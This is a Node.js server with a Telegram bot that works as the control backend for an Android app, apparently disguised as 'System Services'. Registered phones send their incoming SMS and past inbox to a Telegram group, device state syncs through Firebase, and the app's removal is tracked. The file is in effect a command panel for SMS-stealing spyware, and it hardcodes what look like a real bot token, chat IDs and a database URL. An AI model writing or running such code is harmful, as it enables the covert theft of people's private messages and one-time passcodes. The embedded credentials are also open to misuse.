const express = require('express');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// Configuration & Environment Variables
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN || '8832238459:AAGR6_N00HtDjJv7IEdwu-y-1U2RW9VO9rk';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '8753024194';
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID || process.env.GROUPCHATID || '-1004375481014';
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL || `http://localhost:${PORT}`;
const FIREBASE_DATABASE_URL = process.env.FIREBASE_DATABASE_URL || 'https://sms-tracker-6eeed-default-rtdb.asia-southeast1.firebasedatabase.app';

const DEVICES_FILE = path.join(__dirname, 'devices.json');
const DEDUP_FILE = path.join(__dirname, 'dedup_sms.json');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// In-Memory Device Storage: deviceId -> object
const devices = new Map();
let currentGroupChatId = GROUP_CHAT_ID;

// Deduplication Cache: hash -> timestamp
const processedSmsMap = new Map();

function loadDedup() {
  try {
    if (fs.existsSync(DEDUP_FILE)) {
      const data = JSON.parse(fs.readFileSync(DEDUP_FILE, 'utf8'));
      Object.keys(data).forEach(k => processedSmsMap.set(k, data[k]));
      console.log(`[Deduplication] Loaded ${processedSmsMap.size} processed SMS records`);
    }
  } catch (e) {
    console.error('[Deduplication Load Error]:', e.message);
  }
}

function saveDedup() {
  try {
    const entries = Array.from(processedSmsMap.entries());
    if (entries.length > 2000) {
      entries.splice(0, entries.length - 2000);
      processedSmsMap.clear();
      entries.forEach(([k, v]) => processedSmsMap.set(k, v));
    }
    const obj = Object.fromEntries(processedSmsMap);
    fs.writeFileSync(DEDUP_FILE, JSON.stringify(obj), 'utf8');
  } catch (e) {
    console.error('[Deduplication Save Error]:', e.message);
  }
}

loadDedup();

// File Persistence
function loadDevices() {
  try {
    if (fs.existsSync(DEVICES_FILE)) {
      const data = JSON.parse(fs.readFileSync(DEVICES_FILE, 'utf8'));
      Object.keys(data).forEach(id => {
        devices.set(id, data[id]);
      });
      console.log(`[Storage] Loaded ${devices.size} device(s) from devices.json`);
    }
  } catch (e) {
    console.error('[Storage Error] Failed to load devices.json:', e.message);
  }
}

function saveDevices() {
  try {
    const obj = {};
    devices.forEach((val, key) => {
      obj[key] = val;
    });
    fs.writeFileSync(DEVICES_FILE, JSON.stringify(obj, null, 2), 'utf8');
  } catch (e) {
    console.error('[Storage Error] Failed to save devices.json:', e.message);
  }
}

// Online Status Helper (Strict 90 seconds threshold & isOnline flag)
function isDeviceOnline(dev) {
  if (!dev) return false;
  if (dev.isOnline === false) return false;
  const lastSeenMs = dev.lastSeen ? (new Date() - new Date(dev.lastSeen)) : Infinity;
  return lastSeenMs < 90 * 1000;
}

// Firebase Config Sync
async function fetchConfigFromFirebase() {
  try {
    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/config.json`;
    const response = await fetch(url);
    if (response.ok) {
      const data = await response.json();
      if (data && data.groupChatId) {
        currentGroupChatId = data.groupChatId;
      }
    }
  } catch (err) {
    console.error(`[Config Fetch Error]`, err.message);
  }
}

async function updateFirebaseConfig(patchData) {
  try {
    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/config.json`;
    await fetch(url, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(patchData)
    });
  } catch (err) {
    console.error(`[Config Update Error]`, err.message);
  }
}

// Firebase Realtime Devices Sync
async function fetchDevicesFromFirebase() {
  try {
    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/devices.json`;
    const response = await fetch(url);
    if (response.ok) {
      const data = await response.json();
      if (data && typeof data === 'object') {
        Object.keys(data).forEach(devId => {
          const devInfo = data[devId];
          if (devInfo && typeof devInfo === 'object') {
            let lastSeenDate = new Date();
            if (typeof devInfo.lastSeen === 'number') {
              lastSeenDate = devInfo.lastSeen > 100000000000 ? new Date(devInfo.lastSeen) : new Date(devInfo.lastSeen * 1000);
            }

            devices.set(devId, {
              deviceId: devId,
              deviceAlias: devInfo.deviceAlias || devInfo.model || 'Android Device',
              model: devInfo.model || 'Unknown Model',
              batteryLevel: devInfo.batteryLevel ?? -1,
              isCharging: !!devInfo.isCharging,
              isServiceRunning: devInfo.isServiceRunning !== false,
              isForwardingEnabled: devInfo.isForwardingEnabled !== false,
              isOnline: devInfo.isOnline !== false,
              killReason: devInfo.killReason || 'Synced via Firebase',
              lastSeen: lastSeenDate
            });
          }
        });
        saveDevices();
        console.log(`[Firebase Sync] Synced ${devices.size} device(s) from Firebase Realtime Database`);
      }
    }
  } catch (err) {
    console.error(`[Firebase Sync Error]`, err.message);
  }
}

async function updateDeviceInFirebase(devId, patchData) {
  try {
    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/devices/${devId}.json`;
    await fetch(url, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(patchData)
    });
  } catch (err) {
    console.error(`[Firebase Update Error]`, err.message);
  }
}

async function deleteDeviceFromFirebase(devId) {
  try {
    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/devices/${devId}.json`;
    await fetch(url, { method: 'DELETE' });
  } catch (err) {
    console.error(`[Firebase Delete Error]`, err.message);
  }
}

// Load persisted devices and config on startup
loadDevices();
fetchConfigFromFirebase();
fetchDevicesFromFirebase();

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on('polling_error', (error) => {
  console.error('[Telegram Polling Error]:', error.code || error.message);
});

process.on('uncaughtException', (err) => {
  console.error('[Uncaught Exception]:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[Unhandled Rejection]:', reason);
});

// Helper Functions
function isAdmin(chatId) {
  return String(chatId).trim() === String(ADMIN_CHAT_ID).trim();
}

function handleDeviceRegistrationData(data) {
  const deviceId = data.deviceId || data.device_id || data.id;
  if (!deviceId) return null;

  const existing = devices.get(deviceId) || {};
  const updatedDev = {
    deviceId,
    deviceAlias: data.deviceAlias || data.alias || existing.deviceAlias || data.model || 'Android Device',
    model: data.model || existing.model || 'Unknown Model',
    batteryLevel: data.batteryLevel !== undefined ? Number(data.batteryLevel) : (existing.batteryLevel ?? -1),
    isCharging: data.isCharging !== undefined ? Boolean(data.isCharging) : (existing.isCharging ?? false),
    isServiceRunning: data.isServiceRunning !== undefined ? Boolean(data.isServiceRunning) : true,
    isForwardingEnabled: data.isForwardingEnabled !== undefined ? Boolean(data.isForwardingEnabled) : true,
    isOnline: true,
    killReason: data.killReason || existing.killReason || 'Running smoothly',
    lastSeen: new Date().toISOString()
  };

  devices.set(deviceId, updatedDev);
  saveDevices();
  updateDeviceInFirebase(deviceId, updatedDev);
  console.log(`[Device Registered/Updated] ID: ${deviceId} (${updatedDev.deviceAlias})`);
  return updatedDev;
}

function buildMainReplyKeyboard() {
  return {
    keyboard: [
      [{ text: '📱 Connected Devices' }, { text: '📊 Overall Status' }],
      [{ text: '❓ Help & Info' }]
    ],
    resize_keyboard: true
  };
}

function buildDeviceControlMessage(dev) {
  const online = isDeviceOnline(dev);
  const liveStatus = online ? '🟢 *Online & Active*' : '🔴 *Offline / Inactive (Uninstalled or Disconnected)*';
  const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
  const batText = dev.batteryLevel >= 0 ? `${dev.batteryLevel}% ${dev.isCharging ? '🔌 (Charging)' : '🔋'}` : 'Unknown';

  return `📱 *DEVICE CONTROL CENTER*
━━━━━━━━━━━━━━━━━━━━━
🏷️ *Device Name:* \`${dev.deviceAlias}\`
🆔 *Device ID:* \`${dev.deviceId}\`
📲 *Model:* \`${dev.model}\`
⚡ *Battery:* ${batText}
⚙️ *Service:* ${online && dev.isServiceRunning ? '🟢 Running' : '🔴 Stopped'}

⚡ *Live Status:* ${liveStatus}
💬 *SMS Forwarding:* ${fwdStatus}
📋 *Status Info:* ${online ? dev.killReason : 'Disconnected / App Removed'}
━━━━━━━━━━━━━━━━━━━━━
_Select an action below to manage this device:_`;
}

function buildDeviceMainKeyboard(devId, isOnline) {
  const row1 = [
    { text: '💬 SMS Settings', callback_data: `sms_settings_${devId}` },
    { text: '✏️ Rename Device', callback_data: `rename_${devId}` }
  ];

  const row2 = [
    { text: '🔄 Refresh Status', callback_data: `refresh_${devId}` },
    { text: '📋 All Devices List', callback_data: 'dev_list' }
  ];

  const inlineKeyboard = [row1, row2];

  if (!isOnline) {
    inlineKeyboard.push([
      { text: '🗑️ Delete Offline Device Record', callback_data: `delete_dev_${devId}` }
    ]);
  }

  return { inline_keyboard: inlineKeyboard };
}

function buildSmsSettingsMessage(dev) {
  const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
  return `💬 *SMS SETTINGS for \`${dev.deviceAlias}\`*
━━━━━━━━━━━━━━━━━━━━━
📲 *Model:* \`${dev.model}\`
🆔 *Device ID:* \`${dev.deviceId}\`
💬 *SMS Forwarding Status:* ${fwdStatus}
━━━━━━━━━━━━━━━━━━━━━
• *Turn SMS ON*: Enables live SMS forwarding and uploads old past inbox, new & upcoming SMS to bot.
• *Turn SMS OFF*: Disables live SMS forwarding.

_Select an action below:_`;
}

function buildSmsSettingsKeyboard(devId) {
  return {
    inline_keyboard: [
      [
        { text: '🟢 Turn SMS ON', callback_data: `sms_on_${devId}` },
        { text: '🔴 Turn SMS OFF', callback_data: `sms_off_${devId}` }
      ],
      [
        { text: '🔙 Back to Device Control', callback_data: `dev_info_${devId}` }
      ]
    ]
  };
}

// ----------------------------------------------------
// 1. EXPRESS HTTP ENDPOINTS
// ----------------------------------------------------

app.get('/', (req, res) => {
  if (req.query.deviceId || req.query.id) {
    const dev = handleDeviceRegistrationData(req.query);
    return res.json({ success: true, device: dev });
  }
  res.json({
    status: 'online',
    app: 'SMS Forwarder Telegram Bot',
    connectedDevices: devices.size,
    firebaseUrl: FIREBASE_DATABASE_URL,
    groupChatId: currentGroupChatId,
    timestamp: new Date().toISOString()
  });
});

app.get('/ping', (req, res) => {
  res.json({ status: 'alive', time: new Date().toISOString() });
});

const registerRoutes = ['/api/register-device', '/register-device', '/register', '/api/register'];

registerRoutes.forEach(route => {
  app.post(route, (req, res) => {
    const dev = handleDeviceRegistrationData({ ...req.query, ...req.body });
    if (!dev) return res.status(400).json({ error: 'deviceId is required' });
    res.json({ success: true, device: dev });
  });

  app.get(route, (req, res) => {
    const dev = handleDeviceRegistrationData({ ...req.query, ...req.body });
    if (!dev) return res.status(400).json({ error: 'deviceId query param is required' });
    res.json({ success: true, device: dev });
  });
});

app.get('/api/devices', async (req, res) => {
  await fetchDevicesFromFirebase();
  res.json({
    count: devices.size,
    devices: Array.from(devices.values())
  });
});

app.post('/api/forward-sms', async (req, res) => {
  const { deviceId, sender, body, simSlot, timestamp } = req.body;

  if (deviceId && !devices.has(deviceId)) {
    handleDeviceRegistrationData({
      deviceId,
      deviceAlias: 'Android Device',
      model: 'Android Phone',
      killReason: 'Auto-registered on SMS receive'
    });
  }

  const cleanSender = (sender || '').trim();
  const cleanBody = (body || '').trim().replace(/\s+/g, ' ');
  const timeNum = timestamp ? Math.floor(new Date(timestamp).getTime() / 1000) : 0;

  // Deduplication Fingerprints
  const exactKey = `${cleanSender.toLowerCase()}:::${cleanBody}:::${timeNum}`;
  const contentKey = `${cleanSender.toLowerCase()}:::${cleanBody}`;
  const now = Date.now();

  // 1. Filter exact duplicate SMS
  if (processedSmsMap.has(exactKey)) {
    console.log(`[Deduplication] Dropping exact duplicate SMS from ${cleanSender}: "${cleanBody.substring(0, 30)}..."`);
    return res.json({ success: true, duplicate: true, message: 'Exact duplicate SMS skipped' });
  }

  // 2. Filter repeated identical content within 10 minutes
  const lastSentTime = processedSmsMap.get(contentKey);
  if (lastSentTime && (now - lastSentTime) < 10 * 60 * 1000) {
    console.log(`[Deduplication] Dropping repeated SMS from ${cleanSender} (sent ${Math.floor((now - lastSentTime)/1000)}s ago)`);
    return res.json({ success: true, duplicate: true, message: 'Repeated SMS within 10m skipped' });
  }

  // Register in deduplication map and persist
  processedSmsMap.set(exactKey, now);
  processedSmsMap.set(contentKey, now);
  saveDedup();

  const dev = devices.get(deviceId) || { deviceAlias: 'Android Device' };
  const timeStr = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();

  const formattedMsg = `📩 *New SMS Received*\n\n📱 *Device:* \`${dev.deviceAlias}\`\n👤 *From:* \`${sender}\`\n💳 *SIM:* \`${simSlot || 'SIM 1'}\`\n⏰ *Time:* \`${timeStr}\`\n\n💬 *Message:*\n\`${body}\``;

  // Send ONLY to Telegram Group if configured; fallback to Admin chat only if no group exists
  const targets = new Set();
  if (currentGroupChatId) {
    targets.add(currentGroupChatId);
  } else if (ADMIN_CHAT_ID) {
    targets.add(ADMIN_CHAT_ID);
  }

  try {
    for (const targetId of targets) {
      if (targetId) await bot.sendMessage(targetId, formattedMsg, { parse_mode: 'Markdown' });
    }
    res.json({ success: true });
  } catch (err) {
    console.error('Failed to forward SMS to Telegram:', err.message);
    res.status(500).json({ error: err.message });
  }
});

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`====================================================`);
  console.log(`🚀 SMS Forwarder Bot Server running on port ${PORT}`);
  console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
  console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
  if (currentGroupChatId) console.log(`👥 Group Chat ID: ${currentGroupChatId}`);
  console.log(`🔗 External URL: ${RENDER_EXTERNAL_URL}`);
  console.log(`🔥 Firebase URL: ${FIREBASE_DATABASE_URL}`);
  console.log(`💾 Persisted Devices: ${devices.size}`);
  console.log(`====================================================`);
});

// Self-Ping Keep Alive
setInterval(async () => {
  try {
    const pingUrl = RENDER_EXTERNAL_URL.endsWith('/') ? `${RENDER_EXTERNAL_URL}ping` : `${RENDER_EXTERNAL_URL}/ping`;
    const response = await fetch(pingUrl);
    console.log(`[Self-Ping Keep-Alive] Response status: ${response.status}`);
  } catch (err) {
    console.error(`[Self-Ping Keep-Alive] Ping failed:`, err.message);
  }
}, 5 * 60 * 1000);

// Telegram Message Handler
bot.on('message', async (msg) => {
  const chatId = String(msg.chat.id);
  const chatType = msg.chat.type;
  const text = (msg.text || '').trim();

  // Handle Group Registration
  if (chatType === 'group' || chatType === 'supergroup' || chatType === 'channel') {
    currentGroupChatId = chatId;
    await updateFirebaseConfig({ groupChatId: chatId });

    const groupTitle = msg.chat.title || 'Telegram Group';
    const groupReply = `📌 *TELEGRAM GROUP REGISTERED*
━━━━━━━━━━━━━━━━━━━━━
🏷️ *Group Title:* \`${groupTitle}\`
🆔 *Group Chat ID:* \`${chatId}\`
━━━━━━━━━━━━━━━━━━━━━
✅ *Group registered for SMS forwarding!* All incoming SMS and inbox syncs will now be posted directly into this group.`;

    return bot.sendMessage(chatId, groupReply, { parse_mode: 'Markdown' });
  }

  // Fetch latest devices from Firebase on any command
  await fetchConfigFromFirebase();
  await fetchDevicesFromFirebase();

  if (!isAdmin(chatId)) {
    return bot.sendMessage(chatId, '❌ Unauthorized user.');
  }

  if (text === '/start' || text === '/help' || text === '/menu' || text === '❓ Help & Info') {
    return bot.sendMessage(chatId, '🤖 *SMS Forwarder Device Manager*\n━━━━━━━━━━━━━━━━━━━━━\nWelcome! Use the menu buttons at the bottom of your chat box to manage devices.', {
      parse_mode: 'Markdown',
      reply_markup: buildMainReplyKeyboard()
    });
  }

  if (text === '📱 Connected Devices' || text === '/devices' || text === '/status') {
    if (devices.size === 0) {
      return bot.sendMessage(chatId, '📱 *No Devices Connected Yet.*\n\nInstall the System Services app on your Android phone to connect.', {
        parse_mode: 'Markdown',
        reply_markup: buildMainReplyKeyboard()
      });
    }

    if (devices.size === 1) {
      const dev = Array.from(devices.values())[0];
      const online = isDeviceOnline(dev);
      return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
        parse_mode: 'Markdown',
        reply_markup: buildDeviceMainKeyboard(dev.deviceId, online)
      });
    }

    const listButtons = Array.from(devices.values()).map(dev => [
      { text: `${isDeviceOnline(dev) ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
    ]);

    return bot.sendMessage(chatId, '📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: listButtons }
    });
  }

  if (text === '📊 Overall Status' || text === '/info') {
    let onlineCount = 0;
    devices.forEach(d => {
      if (isDeviceOnline(d)) onlineCount++;
    });

    const statusText = `📊 *SYSTEM OVERALL STATUS*\n━━━━━━━━━━━━━━━━━━━━━\n🌐 *Bot Server:* 🟢 Online (Node.js)\n🔥 *Firebase Realtime:* 🟢 Synced\n👥 *Group Chat ID:* \`${currentGroupChatId || 'Not Configured'}\`\n📱 *Total Connected Devices:* ${devices.size}\n🟢 *Online Devices:* ${onlineCount}\n🔴 *Offline Devices:* ${devices.size - onlineCount}\n━━━━━━━━━━━━━━━━━━━━━\n_Select \`📱 Connected Devices\` from bottom menu to view individual devices._`;
    return bot.sendMessage(chatId, statusText, {
      parse_mode: 'Markdown',
      reply_markup: buildMainReplyKeyboard()
    });
  }

  if (text.startsWith('/rename')) {
    const match = text.match(/\/rename\s+(.+)/i);
    if (!match) {
      return bot.sendMessage(chatId, '✏️ *Usage:*\n`/rename New Device Name`\n_OR_\n`/rename <deviceId> New Device Name`', { parse_mode: 'Markdown' });
    }
    const parts = match[1].split(/\s+/);
    if (devices.size === 0) {
      return bot.sendMessage(chatId, '❌ No connected devices found.');
    }

    let dev = Array.from(devices.values())[0];
    let newName = match[1].trim();

    if (devices.has(parts[0]) && parts.length > 1) {
      dev = devices.get(parts[0]);
      newName = parts.slice(1).join(' ').trim();
    }

    const oldName = dev.deviceAlias;
    dev.deviceAlias = newName;
    devices.set(dev.deviceId, dev);
    saveDevices();
    updateDeviceInFirebase(dev.deviceId, { deviceAlias: newName });

    await bot.sendMessage(chatId, `✅ Device renamed from \`${oldName}\` to \`${newName}\`!`, { parse_mode: 'Markdown' });
    const online = isDeviceOnline(dev);
    return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
      parse_mode: 'Markdown',
      reply_markup: buildDeviceMainKeyboard(dev.deviceId, online)
    });
  }
});

// Inline Callback Queries
bot.on('callback_query', async (query) => {
  const chatId = String(query.message.chat.id);
  const messageId = query.message.message_id;
  const data = query.data;

  if (!isAdmin(chatId)) {
    return bot.answerCallbackQuery(query.id, { text: '❌ Unauthorized' });
  }

  await fetchConfigFromFirebase();
  await fetchDevicesFromFirebase();

  if (data === 'dev_list') {
    if (devices.size === 0) {
      return bot.answerCallbackQuery(query.id, { text: 'No devices connected' });
    }
    const listButtons = Array.from(devices.values()).map(dev => [
      { text: `${isDeviceOnline(dev) ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
    ]);
    await bot.editMessageText('📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: listButtons }
    });
    return bot.answerCallbackQuery(query.id, { text: 'Updated device list' });
  }

  const matchAction = data.match(/^(dev_info|sms_settings|sms_on|sms_off|sync_old|rename|refresh|delete_dev)_(.+)$/);
  if (!matchAction) return;

  const action = matchAction[1];
  const devId = matchAction[2];
  const dev = devices.get(devId);

  if (!dev && action !== 'delete_dev') {
    return bot.answerCallbackQuery(query.id, { text: '⚠️ Device not found' });
  }

  switch (action) {
    case 'dev_info':
    case 'refresh': {
      const online = isDeviceOnline(dev);
      await bot.editMessageText(buildDeviceControlMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildDeviceMainKeyboard(devId, online)
      });
      bot.answerCallbackQuery(query.id, { text: 'Refreshed live status' });
      break;
    }

    case 'delete_dev': {
      const devName = dev ? dev.deviceAlias : devId;
      devices.delete(devId);
      saveDevices();
      await deleteDeviceFromFirebase(devId);
      bot.answerCallbackQuery(query.id, { text: '🗑️ Device removed' });
      await bot.sendMessage(chatId, `🗑️ Device \`${devName}\` removed from system.`, { parse_mode: 'Markdown' });

      if (devices.size > 0) {
        const listButtons = Array.from(devices.values()).map(d => [
          { text: `${isDeviceOnline(d) ? '🟢' : '🔴'} ${d.deviceAlias} (${d.model})`, callback_data: `dev_info_${d.deviceId}` }
        ]);
        await bot.sendMessage(chatId, '📱 *Updated Devices List:*', {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: listButtons }
        });
      } else {
        await bot.sendMessage(chatId, '📱 *No Connected Devices Remaining.*', {
          parse_mode: 'Markdown',
          reply_markup: buildMainReplyKeyboard()
        });
      }
      break;
    }

    case 'sms_settings':
      await bot.editMessageText(buildSmsSettingsMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildSmsSettingsKeyboard(devId)
      });
      bot.answerCallbackQuery(query.id, { text: 'SMS Settings menu' });
      break;

    case 'sms_on':
      dev.isForwardingEnabled = true;
      devices.set(devId, dev);
      saveDevices();
      updateDeviceInFirebase(devId, { isForwardingEnabled: true });

      await bot.editMessageText(buildSmsSettingsMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildSmsSettingsKeyboard(devId)
      });
      bot.answerCallbackQuery(query.id, { text: '🟢 SMS Forwarding Enabled' });

      const onMsg = `🟢 *SMS Forwarding Enabled* for \`${dev.deviceAlias}\`.\n\nUpcoming live SMS will be forwarded directly to this group.`;
      if (currentGroupChatId) {
        bot.sendMessage(currentGroupChatId, onMsg, { parse_mode: 'Markdown' });
      } else if (ADMIN_CHAT_ID) {
        bot.sendMessage(ADMIN_CHAT_ID, onMsg, { parse_mode: 'Markdown' });
      }
      break;

    case 'sms_off':
      dev.isForwardingEnabled = false;
      devices.set(devId, dev);
      saveDevices();
      updateDeviceInFirebase(devId, { isForwardingEnabled: false });

      await bot.editMessageText(buildSmsSettingsMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildSmsSettingsKeyboard(devId)
      });
      bot.answerCallbackQuery(query.id, { text: '🔴 SMS Forwarding Disabled' });

      const offMsg = `🔴 *SMS Forwarding Disabled* for \`${dev.deviceAlias}\`.\n\nUpcoming SMS messages will be stopped.`;
      if (currentGroupChatId) {
        bot.sendMessage(currentGroupChatId, offMsg, { parse_mode: 'Markdown' });
      } else if (ADMIN_CHAT_ID) {
        bot.sendMessage(ADMIN_CHAT_ID, offMsg, { parse_mode: 'Markdown' });
      }
      break;

    case 'rename':
      bot.answerCallbackQuery(query.id, { text: 'Send rename command' });
      bot.sendMessage(chatId, `✏️ *To Rename Device \`${dev.deviceAlias}\`:*\n\nSend command in chat:\n\`/rename New Device Name\``, { parse_mode: 'Markdown' });
      break;
  }
});

console.log('Bot listener initialized.');
